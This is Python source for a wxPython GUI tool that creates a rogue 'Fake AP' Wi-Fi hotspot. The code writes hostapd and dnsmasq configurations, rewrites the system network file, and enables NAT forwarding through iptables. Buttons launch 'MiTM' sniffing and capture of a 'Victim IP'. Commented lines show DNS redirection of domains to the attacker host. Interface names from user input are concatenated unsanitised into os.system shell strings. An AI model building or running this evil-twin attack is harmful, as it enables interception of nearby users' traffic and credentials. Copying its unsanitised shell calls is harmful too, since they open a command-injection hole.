import os
import os.path
import wx
from wapitiCore import attack

import wless_commands


class SnifferGUI(wx.Frame):
    def __init__(self, parent, title):
        super(SnifferGUI, self).__init__(parent, title=title, size=(350, 350))

        self.InitUI()
        self.Centre()
        self.Show()

    def InitUI(self):
        panel = wx.Panel(self)
        # ~ panel.SetBackgroundColour('#4f5049')


        # ~ wless_commands.get_monitoring_interfaces()
        self.APname = wx.TextCtrl(panel, -1, "Enter the name of Fake AP", size=(250, 30), pos=(10, 20))

        self.APpasswd = wx.TextCtrl(panel, -1, "Enter the Password of Fake AP", size=(250, 30), pos=(10, 55))

        self.nDeviceList = wx.ComboBox(panel, -1, value='Select Attack Interface', size=(200, 30), pos=(10, 115),
                                       choices=wless_commands.get_net_devices())

        self.nDeviceList2 = wx.ComboBox(panel, -1, value='Select Internet Interface', size=(200, 30), pos=(10, 155),
                                        choices=wless_commands.get_net_devices())

        self.actionButton = wx.Button(panel, -1, label='Create Fake AP', pos=(10, 210))
        self.stopButton = wx.Button(panel, -1, label='Stop Fake AP', pos=(130, 210))

        self.sniffButton = wx.Button(panel, -1, label='MiTM', pos=(10, 250))
        self.victimIPButton = wx.Button(panel, -1, label='Victim IP', pos=(130, 250))

        self.closeButton = wx.Button(panel, -1, label='Close', pos=(250, 250))

        self.myLabel = wx.StaticText(panel, -1, label='', pos=(10, 180))

        self.actionButton.Bind(wx.EVT_BUTTON, self.executeCommand)
        self.stopButton.Bind(wx.EVT_BUTTON, self.stopfakeap)
        self.closeButton.Bind(wx.EVT_BUTTON, self.closeMe)
        self.sniffButton.Bind(wx.EVT_BUTTON, self.sniffdata)
        self.victimIPButton.Bind(wx.EVT_BUTTON, self.getVictimIPaddress)

    # ~ self.on_timer()
    def closeMe(self, e):
        self.Close()

    def sniffdata(self, e):
        import MiTM_sniffer
        MiTM_sniffer.startSniff()

    def getVictimIPaddress(self, e):
        import getVictimIP

        getVictimIP.startSniff()

    def stopfakeap(self, e):
        os.system("kill  `ps aux | grep hostapd | head -1 | awk '{print $2}'`")
        os.system("kill  `ps aux | grep dnsmasq | head -1 | awk '{print $2}'`")
       
        os.system('cp /etc/network/interfaces-bkp /etc/network/interfaces')
        os.system('/etc/init.d/networking restart')

        wx.MessageBox('Fake SSID is Stopped', 'Info', wx.OK | wx.ICON_INFORMATION)

    def executeCommand(self, e):
        attackInterface = self.nDeviceList.GetValue()
        internetInterface = self.nDeviceList2.GetValue()
        fakeAPName = self.APname.GetValue()
        fakeAPPassword = self.APpasswd.GetValue()

        self.myLabel.SetLabel("Created Fake AP: " + str(fakeAPName))

        os.system("ifconfig " + internetInterface + " up")

        hostapd = open('./Modules/hostapd-freenetwpa2.conf', 'wb')

        # ~ config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid=thisisme\nchannel=1\n#enable_karma=1\n"
        # config_file = "interface=" + attackInterface + "\ndriver=nl80211\nssid=" + fakeAPName + "\nchannel=1\n#enable_karma=1\n"

        #~ config_file = '''interface=%s
#~ driver=nl80211
#~ ssid=%s
#~ hw_mode=g
#~ channel=6
#~ macaddr_acl=0
#~ auth_algs=1
#~ ignore_broadcast_ssid=0
#~ wpa=3
#~ wpa_passphrase=%s
#~ wpa_key_mgmt=WPA-PSK
#~ wpa_pairwise=TKIP CCMP
#~ rsn_pairwise=CCMP''' %(attackInterface, fakeAPName, fakeAPPassword)

        config_file = '''interface=%s
bridge=br0
driver=nl80211
country_code=IN
ssid=%s
hw_mode=g
channel=6
wpa=2
wpa_passphrase=%s
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
auth_algs=1
macaddr_acl=0''' %(attackInterface, fakeAPName, fakeAPPassword)

        hostapd.write(config_file)
        hostapd.close()
        # ~ print 2
        
        os.system('cp /etc/network/interfaces /etc/network/interfaces-bkp')
        
        
        networksetup_string = '''auto lo br0
iface lo inet loopback
 
# wireless wlan0
allow-hotplug wlan0
iface wlan0 inet manual
 
# eth0 connected to the ISP router
allow-hotplug eth0
iface eth0 inet manual
 
# Setup bridge
iface br0 inet static
    bridge_ports wlan0 eth0
    address 192.168.1.11
    netmask 255.255.255.0
    network 192.168.1.0
    ## isp router ip, 192.168.1.2 also runs DHCPD ##
    gateway 192.168.1.2
    dns-nameservers 192.168.1.2
'''
        
        networkfile = open('/etc/network/interfaces','w')
        networkfile.write(networksetup_string)
        networkfile.close()
        os.system('/etc/init.d/networking restart')
        
        os.system("gnome-terminal -x hostapd ./Modules/hostapd-freenetwpa2.conf &")
        
        # ~ print 3
        os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
		cat <<EOF > /etc/dnsmasq.conf
log-facility=/var/log/dnsmasq.log
#address=/#/10.0.0.1
#address=/google.com/10.0.0.1
interface=%s
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
#no-resolv
log-queries
EOF""" % attackInterface)
        os.system("service dnsmasq start")

        os.system("""ifconfig """ + attackInterface + """ up
		ifconfig """ + attackInterface + """ 10.0.0.1/24
		iptables -t nat -F
		iptables -F
		iptables -t nat -A POSTROUTING -o """ + internetInterface + """ -j MASQUERADE
		iptables -A FORWARD -i """ + attackInterface + """ -o """ + internetInterface + """ -j ACCEPT
		echo '1' > /proc/sys/net/ipv4/ip_forward""")
        wx.MessageBox(fakeAPName + ' SSID is launched', 'Info', wx.OK | wx.ICON_INFORMATION)


# ~ if __name__ == '__main__':

def main():
    app = wx.App(False)
    frame = SnifferGUI(None, 'Create Fake AP')
    app.MainLoop()

# main()
